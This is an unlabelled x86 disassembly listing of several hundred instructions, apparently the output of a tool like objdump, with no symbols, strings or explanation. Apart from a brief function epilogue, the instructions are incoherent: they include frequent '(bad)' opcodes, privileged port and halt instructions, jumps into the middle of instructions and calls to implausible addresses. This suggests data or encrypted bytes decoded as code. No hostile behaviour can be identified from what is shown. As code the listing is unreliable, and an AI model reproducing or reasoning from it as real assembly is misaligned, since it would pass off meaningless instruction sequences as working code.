  4121b3:	imul   ecx,DWORD PTR [edi+edi*2-0x8],0x4158f8f3
  4121bb:	fld    DWORD PTR [ebp-0x12]
  4121be:	dec    ebx
  4121bf:	cwde   
  4121c0:	add    edi,esp
  4121c2:	xchg   al,dh
  4121c4:	jno    0x4121c2
  4121c6:	and    BYTE PTR [ebp+0x70866876],bl
  4121cc:	rol    BYTE PTR [eax-0x311ea8b5],cl
  4121d2:	(bad)  
  4121d3:	push   0x3ee9bda2
  4121d8:	sbb    al,0x8b
  4121da:	imul   edi,DWORD PTR [ebx-0x1594c80f],0xa6bc9bf0
  4121e4:	and    eax,0x9a943238
  4121e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121ea:	mov    ch,0xc7
  4121ec:	mov    ecx,DWORD PTR [eax+0x3f]
  4121ef:	cmp    DWORD PTR ds:0x23de2698,esi
  4121f5:	xchg   esp,eax
  4121f6:	ret    0x11a1
  4121f9:	je     0x4121c9
  4121fb:	jo     0x4121d2
  4121fd:	fsubr  st(7),st
  4121ff:	aas    
  412200:	sbb    eax,0x6390da27
  412205:	pop    ss
  412206:	arpl   dx,di
  412208:	jle    0x4121e2
  41220a:	add    BYTE PTR [eax-0x255b0856],0x18
  412211:	xchg   DWORD PTR [eax],esp
  412213:	rcr    BYTE PTR ds:0x7986a19,cl
  412219:	enter  0x968c,0x54
  41221d:	pusha  
  41221e:	adc    al,0xb2
  412220:	loop   0x4121e1
  412222:	scas   al,BYTE PTR es:[edi]
  412223:	or     esi,DWORD PTR [esi-0x7ff298d9]
  412229:	mov    ds:0xb3941d56,eax
  41222e:	dec    ebx
  41222f:	xor    edx,edx
  412231:	add    DWORD PTR [ebp-0xc],ebx
  412234:	pop    ebx
  412235:	mov    eax,DWORD PTR [ebp-0xc]
  412238:	pop    edi
  412239:	pop    esi
  41223a:	pop    ebx
  41223b:	leave  
  41223c:	ret    0x10
  41223f:	dec    ebp
  412240:	push   ebp
  412241:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  412247:	mov    esp,ebp
  412249:	or     ah,dh
  41224b:	dec    ebp
  41224c:	add    bh,al
  41224e:	add    BYTE PTR [eax],cl
  412250:	add    BYTE PTR [eax],al
  412252:	mov    DWORD PTR [eax],0x40f44545
  412258:	xor    DWORD PTR [eax],eax
  41225a:	test   DWORD PTR [ebx-0x34070b64],ecx
  412260:	(bad)  
  412261:	enter  0x4d45,0xbc
  412265:	mov    esi,DWORD PTR [eax]
  412267:	hlt    
  412268:	test   ebx,ecx
  41226a:	pushf  
  41226b:	enter  0x4df8,0x8b
  41226f:	mov    DWORD PTR [ebp-0x20],0x890208
  412276:	inc    ebp
  412277:	inc    ebp
  412278:	cld    
  412279:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41227f:	or     BYTE PTR [ebx+0x0],dl
  412282:	mov    ebx,0x8bd5500
  412287:	call   DWORD PTR [ecx-0x1]
  41228a:	pop    es
  41228b:	mov    ch,0x33
  41228d:	dec    ebx
  41228f:	(bad)  
  412290:	mov    eax,0x72009ca4
  412295:	push   DWORD PTR [edx]
  412297:	or     BYTE PTR [eax],al
  412299:	jmp    0xff89:0x75c84d03
  4122a0:	dec    ebp
  4122a1:	loopne 0x412273
  4122a3:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  4122a9:	add    BYTE PTR [ebx],dh
  4122ab:	mov    ecx,ebx
  4122ad:	hlt    
  4122ae:	add    ecx,ebx
  4122b0:	enter  0x899c,0x32
  4122b4:	dec    ebp
  4122b5:	add    ecx,eax
  4122b7:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  4122bd:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4122c4:	xor    ecx,ebx
  4122c6:	retf   
  4122c7:	enter  0x4d03,0xc8
  4122cb:	mov    DWORD PTR fs:[eax],ebx
  4122ce:	lea    eax,[eax]
  4122d0:	push   esp
  4122d1:	mov    edi,edi
  4122d3:	fs (bad) 
  4122d5:	(bad)  
  4122d6:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4122dc:	push   0xffffffff
  4122de:	and    bh,bh
  4122e0:	pop    ecx
  4122e1:	inc    eax
  4122e2:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4122e8:	push   0xffffff8b
  4122ea:	pop    ecx
  4122eb:	cld    
  4122ec:	dec    ebp
  4122ed:	lea    ecx,[ecx+0x45ff08ff]
  4122f3:	mov    BYTE PTR [edx+0x1],cl
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	mov    DWORD PTR [ebp+0x8],0x58008d
  4122ff:	dec    DWORD PTR [ebp-0x77]
  412302:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  412309:	cld    
  41230a:	dec    ebp
  41230b:	jne    0x412340
  41230d:	lea    eax,[ebx]
  41230f:	push   eax
  412310:	mov    edi,edi
  412312:	or     BYTE PTR [ecx+0x54a845],cl
  412318:	add    al,ch
  41231a:	(bad)  
  41231b:	sub    esp,ebp
  41231d:	add    BYTE PTR [eax],al
  41231f:	rol    BYTE PTR [eax],0x84
  412322:	inc    ebp
  412323:	add    dh,BYTE PTR [esi+0x0]
  412326:	add    BYTE PTR [ebp-0x73],al
  412329:	mov    ebp,DWORD PTR [esp+edx*4]
  41232c:	inc    DWORD PTR [eax]
  41232e:	lea    ecx,[ebx-0x30074f4]
  412334:	call   0x422eb9
  412339:	add    BYTE PTR [ebp+0x0],cl
  41233c:	jne    0x41237f
  41233e:	dec    DWORD PTR [ebx-0x76210314]
  412344:	dec    ebp
  412345:	add    DWORD PTR [ebp+0x0],esi
  412348:	(bad)  
  412349:	xchg   ebp,eax
  41234a:	loopne 0x41234b
  41234c:	inc    eax
  41234d:	inc    DWORD PTR [eax]
  41234f:	mov    ecx,DWORD PTR [ebp-0x4]
  412352:	xor    edx,DWORD PTR [edx+0x7201b8]
  412358:	add    BYTE PTR [edx],dl
  41235a:	enter  0x4d90,0x0
  41235e:	mov    eax,DWORD PTR [eax]
  412360:	hlt    
  412361:	add    al,0xa5
  412363:	mov    al,0xff
  412365:	add    bh,bh
  412367:	add    BYTE PTR [ebx],dh
  412369:	inc    DWORD PTR [ebx]
  41236b:	sbb    al,0x89
  41236d:	jne    0x412347
  41236f:	mov    esp,DWORD PTR [ecx+0x4500fc]
  412375:	mov    eax,DWORD PTR [ebp-0xff0048]
  41237b:	mov    DWORD PTR [eax-0x70],0xee58ed89
  412382:	inc    DWORD PTR [ebp-0x75]
  412385:	fisttp QWORD PTR [eax+eiz*8]
  412388:	test   DWORD PTR [esi-0x1],esp
  41238b:	inc    ebp
  41238c:	(bad)  
  41238d:	aas    
  41238e:	inc    ebp
  41238f:	(bad)  
  412390:	lea    edi,[esp+eiz*2-0x1]
  412394:	inc    edi
  412396:	mov    DWORD PTR ds:0x8000c7a0,edi
  41239c:	mov    ebp,esi
  41239e:	cld    
  41239f:	in     al,0x8d
  4123a1:	inc    ebp
  4123a2:	jmp    eax
  4123a4:	(bad)  
  4123a5:	fisttp WORD PTR [eax+0x8801c7]
  4123ab:	jecxz  0x4123f2
  4123ad:	out    dx,al
  4123ae:	inc    DWORD PTR [ebp-0x4]
  4123b1:	out    0x8d,eax
  4123b3:	aas    
  4123b4:	inc    edi
  4123b6:	jmp    FWORD PTR [eax-0x78]
  4123b9:	inc    DWORD PTR [ecx]
  4123bb:	mov    DWORD PTR [eax],0xc7a83d
  4123c1:	ins    BYTE PTR es:[edi],dx
  4123c2:	test   edi,edi
  4123c4:	pandn  mm0,mm5
  4123c7:	aas    
  4123c8:	add    bh,al
  4123ca:	mov    esi,DWORD PTR [eax-0x4]
  4123cd:	inc    DWORD PTR [eax+0xdf01e0]
  4123d3:	(bad)  
  4123d4:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4123d8:	mov    ebp,ebx
  4123da:	xchg   esp,eax
  4123db:	fild   DWORD PTR [eax]
  4123dd:	(bad)  
  4123de:	mov    edi,DWORD PTR [eax+0x3]
  4123e1:	(bad)  
  4123e2:	cmp    al,0xe7
  4123e4:	dec    ebp
  4123e5:	leave  
  4123e6:	mov    ebp,eax
  4123e8:	fsubr  DWORD PTR [ecx]
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	lea    ecx,[ebx-0x7f0003b4]
  4123f2:	push   edx
  4123f3:	add    DWORD PTR [ebp+0x0],edx
  4123f6:	mov    esi,DWORD PTR [eax]
  4123f8:	mov    WORD PTR [ebx-0x7a750000],?
  4123fe:	add    esi,DWORD PTR [ebp-0x78]
  412401:	mov    eax,DWORD PTR [eax]
  412403:	cld    
  412404:	push   0x7d
  412406:	dec    DWORD PTR [ebx+0xd88c]
  41240c:	push   edx
  41240d:	mov    edx,DWORD PTR [ecx-0x4]
  412410:	call   DWORD PTR [eax+0x7d01fc]
  412416:	mov    ebx,edx
  412418:	cld    
  412419:	add    BYTE PTR [eax+0x560150],dl
  41241f:	test   DWORD PTR [ebp+0x75],eax
  412422:	in     al,0x8b
  412424:	in     al,dx
  412425:	cld    
  412426:	(bad)  
  412427:	jge    0x4123bd
  412429:	mov    esp,ebx
  41242b:	fsub   st,st(7)
  41242d:	add    bh,al
  41242f:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  412435:	add    edi,edi
  412437:	add    bh,bh
  412439:	mov    eax,0x50d800ed
  41243e:	inc    ebp
  41243f:	push   esi
  412440:	fisttp WORD PTR [ebx+0x4dc7f43f]
  412446:	test   BYTE PTR [ebx],dh
  412448:	fadd   DWORD PTR ds:0x4572c2
  41244e:	jmp    0x412411
  412450:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  412457:	inc    esi
  412458:	jo     0x41245a
  41245a:	test   edi,eax
  41245c:	jmp    esp
  41245e:	inc    DWORD PTR [eax]
  412460:	in     eax,dx
  412461:	add    al,bl
  412463:	jne    0x4123ea
  412465:	mov    edi,edi
  412467:	cld    
  412468:	inc    DWORD PTR [ebp-0x12]
  41246b:	mov    esp,esp
  41246d:	mov    ah,0x85
  41246f:	add    bh,bh
  412471:	call   0x1194d75
  412476:	ret    0x858b
  412479:	cld    
  41247a:	inc    DWORD PTR [eax+0xe301ff]
  412480:	out    dx,al
  412481:	xor    BYTE PTR [ebp-0xff00cf],al
  412487:	mov    ebx,ebp
  412489:	cld    
  41248a:	jo     0x412415
  41248c:	or     DWORD PTR [ecx],eax
  41248e:	add    BYTE PTR [eax],al
  412490:	push   eax
  412491:	add    DWORD PTR [ebp+0x45],eax
  412494:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  41249a:	dec    DWORD PTR [ebx-0x3fda0318]
  4124a0:	add    BYTE PTR [ebp-0xbf0040],dl
  4124a6:	inc    ebp
  4124a7:	or     BYTE PTR [ebx-0x4faf0400],0x45
  4124ae:	add    DWORD PTR [ebx+0x459c00],ecx
  4124b4:	mov    edi,edi
  4124b6:	mov    eax,0xe80800ff
  4124bb:	inc    ebp
  4124bc:	sub    BYTE PTR [ebx-0x47000400],cl
  4124c2:	add    al,0x1
  4124c4:	rol    BYTE PTR [eax],0x1e
  4124c7:	jne    0x41250e
  4124c9:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4124cf:	inc    DWORD PTR [ecx]
  4124d1:	call   0x864cd6
  4124d6:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4124dc:	call   0x414ce2
  4124e1:	xor    bh,bh
  4124e3:	push   edi
  4124e4:	adc    BYTE PTR [ebx-0x747423bb],al
  4124ea:	loopne 0x4124c8
  4124ec:	ret    
  4124ed:	loopne 0x41248b
  4124ef:	xor    DWORD PTR [edx],0x31
  4124f2:	cmp    edi,edi
  4124f4:	bswap  esp
  4124f6:	rol    BYTE PTR gs:[eax],0x5
  4124fa:	jmp    0x12c2644
  4124ff:	mov    eax,DWORD PTR [ebp-0x4]
  412502:	add    BYTE PTR [eax+0xff0100],bh
  412508:	cld    
  412509:	jne    0x412588
  41250b:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  412511:	push   ss
  412512:	add    DWORD PTR [eax],eax
  412514:	add    BYTE PTR [eax+0x7f],dl
  412517:	inc    ebp
  412518:	add    BYTE PTR [ebx+0x459850],cl
  41251e:	mov    edi,edi
  412520:	test   al,0xff
  412522:	add    BYTE PTR [eax],cl
  412524:	inc    DWORD PTR [ebp-0x18]
  412527:	jmp    DWORD PTR ds:0x4d7d00dc
  41252d:	adc    BYTE PTR [ebx+0x459cb9],cl
  412533:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  412539:	pushf  
  41253a:	mov    eax,0x30132
  41253f:	lea    esi,[ebp+0x2c]
  412542:	xor    edi,edi
  412544:	(bad)  
  412545:	call   0x1404cb2
  41254a:	call   0x1354dda
  41254f:	jne    0x4124dc
  412551:	xor    edi,esp
  412553:	add    eax,DWORD PTR [eax+0xc018d]
  412559:	push   DWORD PTR [eax]
  41255b:	call   0xca4cb7
  412560:	int3   
  412561:	inc    DWORD PTR [ebp-0x14]
  412564:	mov    ecx,DWORD PTR [ebp-0x28]
  412567:	xor    eax,DWORD PTR [eax]
  412569:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  41256f:	(bad)  
  412570:	xchg   ebp,eax
  412571:	in     al,0xff
  412573:	add    bh,bh
  412575:	add    BYTE PTR [ebp+0x45],dl
  412578:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  41257e:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  412585:	mov    edi,edi
  412587:	or     BYTE PTR [eax],cl
  412589:	inc    ebp
  41258a:	test   DWORD PTR gs:[eax],eax
  41258d:	je     0x4125d4
  41258f:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  412595:	xor    edx,DWORD PTR [eax-0x73]
  412598:	push   ebp
  412599:	or     BYTE PTR [ebp+0x21007572],al
  41259f:	inc    ebp
  4125a0:	in     al,dx
  4125a1:	mov    ebp,DWORD PTR [eax]
  4125a3:	mov    esp,0x648bc345
  4125a8:	fmul   st,st(5)
  4125aa:	add    BYTE PTR [ebx],ch
  4125ac:	mov    eax,DWORD PTR [ebx]
  4125ae:	cld    
  4125af:	loopne 0x412571
  4125b1:	inc    ebp
  4125b2:	push   ebp
  4125b3:	cmp    ebp,eax
  4125b5:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  4125bc:	cld    
  4125bd:	fadd   DWORD PTR [eax+0x3b014d]
  4125c3:	jne    0x4125f5
  4125c5:	push   0xf8898557
  4125ca:	in     al,dx
  4125cb:	jne    0x412612
  4125cd:	lea    eax,[ebx+0x72e8dcc8]
  4125d3:	das    
  4125d4:	mov    eax,DWORD PTR [eax]
  4125d6:	mov    esp,0x33eb7545
  4125db:	mov    edi,DWORD PTR [edi+0x4572bc]
  4125e1:	xor    eax,edi
  4125e3:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  4125ed:	rcl    BYTE PTR [eax-0x40],1
  4125f0:	inc    ebp
  4125f1:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4125f9:	inc    ebp
  4125fa:	xchg   ebp,eax
  4125fb:	ud0    ebp,DWORD PTR [ebx]
  4125fe:	inc    DWORD PTR [eax]
  412600:	retf   
  412601:	jbe    0x412603
  412603:	mov    dl,BYTE PTR [eax-0x80]
  412606:	push   ebp
  412607:	pop    ds
  412608:	mov    ecx,DWORD PTR [esp+esi*8]
  41260b:	inc    eax
  41260c:	retf   
  41260d:	inc    ebp
  41260e:	iret   
  41260f:	jb     0x4125d9
  412611:	mov    eax,DWORD PTR [edi]
  412613:	enter  0x4545,0x1
  412617:	xor    DWORD PTR [eax],eax
  412619:	pushf  
  41261a:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  412620:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  412627:	dec    ebp
  412628:	add    BYTE PTR [ebx],dh
  41262a:	inc    ebp
  41262b:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  412631:	xor    dl,BYTE PTR [edx]
  412633:	add    eax,DWORD PTR [ebp-0x77]
  412636:	mov    eax,esp
  412638:	fmul   DWORD PTR [ebp-0x3d]
  41263b:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  412642:	mov    DWORD PTR [ebp-0x28],eax
  412645:	rol    DWORD PTR [ebp-0x64],1
  412648:	xor    eax,edi
  41264a:	mov    ecx,0xff858db0
  41264f:	clc    
  412650:	enter  0x4d45,0x32
  412654:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  41265b:	test   esi,edi
  41265d:	clc    
  41265e:	inc    DWORD PTR [ebp+0x45]
  412661:	cmp    al,0x8b
  412663:	pushf  
  412664:	or     bh,al
  412666:	enter  0x16a8,0x85
  41266a:	xor    eax,edi
  41266c:	pushf  
  41266d:	inc    ebp
  41266e:	(bad)  
  41266f:	ds cld 
  412671:	pushf  
  412672:	inc    ebp
  412673:	mov    edx,DWORD PTR [eax-0x28]
  412676:	lock push ebp
  412678:	add    BYTE PTR [ebx],dh
  41267a:	mov    DWORD PTR [ebx],eax
  41267c:	sar    BYTE PTR [ebx],1
  41267e:	adc    BYTE PTR [edi],cl
  412680:	dec    ebp
  412681:	adc    al,0x8b
  412683:	add    al,dl
  412685:	jmp    0x1022855
  41268a:	jb     0x4126d9
  41268c:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  412692:	xor    ecx,DWORD PTR [ebp+0x3b]
  412695:	xor    ecx,DWORD PTR [edi]
  412697:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  41269b:	(bad)  
  41269d:	clc    
  41269e:	enter  0x8400,0x8b
  4126a2:	pop    es
  4126a3:	mov    al,0x0
  4126a5:	push   ebp
  4126a6:	push   cs
  4126a7:	xor    ecx,eax
  4126a9:	xor    esp,ecx
  4126ab:	add    ebp,DWORD PTR [eax]
  4126ad:	add    esi,DWORD PTR [eax]
  4126af:	(bad)  
  4126b1:	retf   0x55c8
  4126b4:	repnz mov eax,DWORD PTR [ebp-0x10]
  4126b8:	(bad)  
  4126b9:	cli    
  4126ba:	fdivr  st,st(1)
  4126bc:	test   DWORD PTR [eax+edi*8],ecx
  4126bf:	dec    ebp
  4126c0:	inc    ebp
  4126c1:	xor    edi,DWORD PTR [eax-0x7167afd]
  4126c7:	add    BYTE PTR [ebp+0x0],al
  4126ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4126cd:	mov    ecx,ebx
  4126cf:	clc    
  4126d0:	jne    0x41269d
  4126d2:	mov    esi,0xd672d3
  4126d7:	into   
  4126d8:	into   
  4126d9:	scas   eax,DWORD PTR es:[edi]
  4126da:	dec    ebp
  4126db:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4126e1:	sub    ecx,esi
  4126e3:	cmp    ecx,DWORD PTR [ebp+0x77]
  4126e6:	(bad)  
  4126e7:	mov    edi,eax
  4126e9:	mov    al,0x85
  4126eb:	mov    eax,edi
  4126ed:	add    BYTE PTR [ebp-0x75],al
  4126f0:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4126f7:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4126fd:	(bad)  
  4126ff:	retf   0x559c
  412702:	(bad)  
  412703:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  41270a:	inc    ebp
  41270b:	add    eax,0xeb9c4d3f
  412710:	(bad)  
  412711:	mov    ecx,esp
  412713:	lods   al,BYTE PTR ds:[esi]
  412714:	test   DWORD PTR [ebp-0x8],edx
  412717:	xor    ecx,DWORD PTR [ebp+0x33]
  41271a:	mov    eax,DWORD PTR [ebx]
  41271c:	lock add ecx,ebx
  41271f:	bswap  esi
  412721:	retf   0x55d1
  412724:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  41272a:	jmp    0x412725
  41272c:	add    BYTE PTR ds:0xebc44d8b,al
  412732:	push   ebp
  412733:	mov    ebp,DWORD PTR [ebx]
  412735:	test   al,0x8b
  412737:	push   ebp
  412738:	clc    
  412739:	xor    ecx,ebx
  41273b:	xor    ecx,esi
  41273d:	add    edx,ecx
  41273f:	add    eax,DWORD PTR [edx+0xca010f]
  412745:	push   ebp
  412746:	dec    ebp
  412747:	mov    ecx,DWORD PTR [ebx-0x34050710]
  41274d:	stc    
  41274e:	rol    DWORD PTR ds:0xebce4dd6,cl
  412754:	scas   eax,DWORD PTR es:[edi]
  412755:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  41275b:	xor    ebp,DWORD PTR [ebx]
  41275d:	xor    edi,DWORD PTR [ebx]
  41275f:	add    esi,DWORD PTR [edi+0x3]
  412762:	mov    ecx,DWORD PTR [edi]
  412764:	clc    
  412765:	retf   0x55cb
  412768:	into   
  412769:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  412770:	mov    eax,0x3376554d
  412775:	mov    esi,DWORD PTR [ebx]
  412777:	int3   
  412778:	add    edx,DWORD PTR [ebp+0x3]
  41277b:	xor    ecx,DWORD PTR [edi]
  41277d:	xor    ecx,edx
  41277f:	add    edx,DWORD PTR [ebp+0x3]
  412782:	mov    ecx,DWORD PTR [edi]
  412784:	lock retf 0x4dfa
  412788:	stc    
  412789:	mov    ecx,DWORD PTR [eax]
  41278b:	or     BYTE PTR [ebp+0x4d],cl
  41278e:	jmp    0x105281e
  412793:	dec    ebp
  412794:	dec    ebp
  412795:	(bad)  
  412796:	mov    ebx,esp
  412798:	clc    
  412799:	test   ebx,ecx
  41279b:	clc    
  41279c:	ror    DWORD PTR [ebp-0x2a],cl
  41279f:	mov    esi,ecx
  4127a1:	call   0x33cc6d55
  4127a6:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  4127ad:	retf   
  4127ae:	ja     0x41277e
  4127b0:	mov    ebp,DWORD PTR [eax-0x48]
  4127b3:	dec    ebp
  4127b4:	xor    ecx,DWORD PTR [di+0x3]
  4127b8:	mov    esp,esp
  4127ba:	clc    
  4127bb:	push   ebp
  4127bc:	retf   
  4127bd:	mov    dl,bl
  4127bf:	adc    esi,edx
  4127c1:	jb     0x412791
  4127c3:	add    BYTE PTR [edi-0x3b7474b3],ch
  4127c9:	call   0x4d6cf34b
  4127ce:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4127d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d5:	pushf  
  4127d6:	inc    ebp
  4127d7:	xor    cl,BYTE PTR [ebp-0x78]
  4127da:	mov    edx,edi
  4127dc:	clc    
  4127dd:	dec    ebp
  4127de:	retf   
  4127df:	mov    edx,ebx
  4127e1:	call   0x560ffbbc
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4127ed:	pushf  
  4127ee:	sub    esi,DWORD PTR [edx]
  4127f0:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4127f6:	lods   al,BYTE PTR ds:[esi]
  4127f7:	xor    esp,DWORD PTR [ebx]
  4127f9:	add    ecx,DWORD PTR [ebp-0x1c]
  4127fc:	mov    edi,DWORD PTR [ebp-0x8]
  4127ff:	mov    bl,cl
  412801:	cmp    dl,bl
  412803:	jb     0x4127d3
  412805:	add    dh,dl
  412807:	dec    ebp
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  41280f:	shr    DWORD PTR [ebx],cl
  412811:	into   
  412812:	cmp    edx,esi
  412814:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  41281a:	dec    ebp
  41281b:	dec    ebp
  41281c:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  412822:	retf   
  412823:	xor    edx,esi
  412825:	add    ecx,esi
  412827:	imul   ecx,edx
  41282a:	mov    DWORD PTR [ebp+0x8],edx
  41282d:	xor    ecx,DWORD PTR [ebp+0x2b]
  412830:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  412836:	add    esi,DWORD PTR [ebx]
  412838:	mov    ah,0x3
  41283a:	inc    ebp
  41283b:	rdtsc  
  41283d:	xlat   BYTE PTR ds:[ebx]
  41283e:	pushf  
  41283f:	jge    0x4127ca
  412841:	xor    ebx,eax
  412843:	sub    eax,DWORD PTR [ebp-0x73]
  412846:	(bad)  
  412847:	cmp    al,al
  412849:	jb     0x4127d0
  41284b:	add    al,bh
  41284d:	ror    DWORD PTR [ebp-0x7a],1
  412850:	xor    edi,edi
  412852:	add    edi,edi
  412854:	jmp    0x4128a3
  412856:	mov    ecx,DWORD PTR [ebx-0x34341324]
  41285c:	dec    ebp
  41285d:	into   
  41285e:	mov    ebp,DWORD PTR [edi-0x23737428]
  412864:	pushf  
  412865:	shl    DWORD PTR [edx],cl
  412867:	retf   0x5588
  41286a:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412870:	add    eax,DWORD PTR [eax]
  412872:	in     al,0x4d
  412874:	push   ebp
  412875:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  41287b:	fs add ch,cl
  41287e:	dec    ebp
  41287f:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  412885:	dec    ebp
  412886:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  41288c:	jge    0x41285c
  41288e:	mov    BYTE PTR [edi+0xf723b3a],ch
  412894:	add    cl,dh
  412896:	dec    ebp
  412897:	dec    DWORD PTR [ebx-0x2c032375]
  41289d:	adc    BYTE PTR [ebp+0x1],0x8b
  4128a1:	add    al,bl
  4128a3:	jge    0x412831
  4128a5:	push   0xffffff9c
  4128a7:	push   0x8b3032
  4128ac:	shl    BYTE PTR [ebp+0x55],0x6a
  4128b0:	xor    edi,edi
  4128b2:	xor    edx,DWORD PTR [ebx+eax*1]
  4128b5:	inc    ebp
  4128b6:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4128bc:	dec    ebp
  4128bd:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4128c3:	jbe    0x412850
  4128c5:	mov    ebp,esp
  4128c7:	ror    bl,1
  4128c9:	enter  0x14ce,0xaf
  4128cd:	dec    DWORD PTR [ebx-0x2cef17f8]
  4128d3:	push   ebp
  4128d4:	retf   0x5540
  4128d7:	push   ebp
  4128d8:	mov    esi,DWORD PTR [edx-0x1c]
  4128db:	mov    edx,ebx
  4128dd:	cld    
  4128de:	(bad)  
  4128df:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4128e6:	sti    
  4128e7:	add    dh,cl
  4128e9:	push   0xffffff94
  4128eb:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  4128f2:	bswap  esp
  4128f4:	pop    esi
  4128f5:	inc    ebp
  4128f6:	dec    DWORD PTR [ecx+0x45e8c88b]
  4128fc:	push   ebp
  4128fd:	xor    esi,DWORD PTR [ebx]
  4128ff:	mov    DWORD PTR [ebx],0xcac00f9c
  412905:	aas    
  412906:	push   ebp
  412907:	inc    ebp
  412908:	xor    ecx,eax
  41290a:	add    ecx,eax
  41290c:	mov    eax,DWORD PTR [ebx]
  41290e:	(bad)  
  41290f:	jmp    0x41289d
  412911:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  412918:	les    edi,FWORD PTR [esi-0xeccefb3]
  41291e:	mov    edx,0xff378d80
  412923:	mov    dh,0xd1
  412925:	cmp    edx,DWORD PTR [ebp+0xf]
  412928:	mov    eax,DWORD PTR [edx-0x20]
  41292b:	add    BYTE PTR [ebp-0x75],bh
  41292e:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  412935:	pushf  
  412936:	retf   0x8632
  412939:	cmp    ebp,0x8
  41293c:	call   ebx
  41293e:	inc    ebp
  41293f:	inc    ebp
  412940:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  412946:	mov    esi,DWORD PTR [ecx]
  412948:	enter  0x49c,0xc7
  41294c:	add    al,al
  41294e:	add    bl,al
  412950:	(bad)  
  412951:	clc    
  412952:	enter  0x45,0x31
  412956:	push   eax
  412957:	pushf  
  412958:	mov    edi,eax
  41295a:	int3   
  41295b:	or     al,al
  41295d:	test   DWORD PTR [edi],edi
  41295f:	clc    
  412960:	gs inc ebp
  412962:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  412968:	push   ss
  412969:	xor    ecx,DWORD PTR [ebp+0x3]
  41296c:	sub    edx,DWORD PTR [ecx-0x76]
  41296f:	dec    ebp
  412970:	add    DWORD PTR [ebx+0x88d845],ecx
  412976:	mov    esi,DWORD PTR [ebx]
  412978:	or     BYTE PTR [ebx],al
  41297a:	cmp    edx,DWORD PTR [ecx-0x38]
  41297d:	dec    ebp
  41297e:	out    dx,eax
  41297f:	xor    eax,DWORD PTR [ebp+0x3]
  412982:	mov    edx,DWORD PTR [ecx-0x28]
  412985:	dec    ebp
  412986:	add    BYTE PTR [ebx],dh
  412988:	push   0x518003
  41298d:	push   eax
  41298e:	add    BYTE PTR [ebx-0x300748b],cl
  412994:	sbb    BYTE PTR [ebp+0x45],cl
  412997:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  41299d:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4129a3:	dec    ebp
  4129a4:	inc    ebp
  4129a5:	xor    ecx,eax
  4129a7:	add    ecx,eax
  4129a9:	push   ecx
  4129aa:	(bad)  
  4129ab:	dec    ebp
  4129ac:	mov    al,ds:0xc5e03dff
  4129b1:	retf   
  4129b2:	(bad)  
  4129b3:	into   
  4129b4:	sub    bh,bh
  4129b6:	dec    esp
  4129b7:	adc    al,0x9c
  4129b9:	inc    ebp
  4129ba:	push   ebp
  4129bb:	test   DWORD PTR [edi],ecx
  4129bd:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  4129c4:	jmp    0xc9ba38d8
  4129c9:	add    cl,dl
  4129cb:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
